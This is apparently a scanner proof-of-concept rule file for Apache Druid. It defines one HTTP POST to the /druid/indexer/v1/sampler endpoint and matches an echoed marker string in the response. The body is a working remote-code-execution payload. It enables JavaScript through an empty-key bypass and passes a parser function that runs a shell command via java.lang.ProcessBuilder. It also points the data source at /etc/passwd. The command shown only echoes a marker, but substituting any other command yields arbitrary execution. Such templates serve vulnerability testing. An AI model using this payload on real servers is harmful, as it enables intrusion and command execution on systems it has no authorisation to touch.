[set]

[rules-req01]
method = POST
header = {
         'Accept': 'application/json, text/plain, */*',
         'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
         'Accept-Encoding': 'gzip, deflate',
         'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,vi;q=0.5',
         'Content-Type': 'application/json;charset=UTF-8',
         'Origin': 'http://172.16.78.135:8888',
         'Referer': 'http://172.16.78.135:8888/unified-console.html'
         }
path = /druid/indexer/v1/sampler?for=parser
body = {
       "type" : "index",
       "spec" : {
       "dataSchema" : {
       "dataSource" : "test",
       "parser" : {
       "type" : "string",
       "parseSpec":{
       "format" : "javascript",
       "timestampSpec" : {
       "column" : "timestamp",
       "missingValue": "2010-01-01T00:00:00Z"
       },
       "dimensionsSpec" : {
       "dimensions" : ["page","test"]
       },
       "function" : "function(str) { var input = new java.lang.ProcessBuilder(\"sh\",\"-c\",\"echo 72ad976ad5d491ad\").start().getInputStream();var s = new java.util.Scanner(input).useDelimiter(\"\\\\A\");return { test: s.next() } }",
       "": {
       "enabled": true
       }
       }
       },
       "metricsSpec" : [],
       "granularitySpec" : {
       "segmentGranularity": "DAY"
       }
       },
       "ioConfig" : {
       "type" : "index",
       "firehose": {
       "type": "local",
       "filter"   : "passwd",
       "baseDir"  : "/etc",
       "data": "1,1,1,1,1"
       }
       },
       "tuningConfig" : {
       "type" : "index",
       "maxNumConcurrentSubTasks" : 2,
       "forceGuaranteedRollup" : false
       }
       }
       }
expression = 72ad976ad5d491ad
follow_redirects = true

[detail]
author = rocky
links = 91xx.org

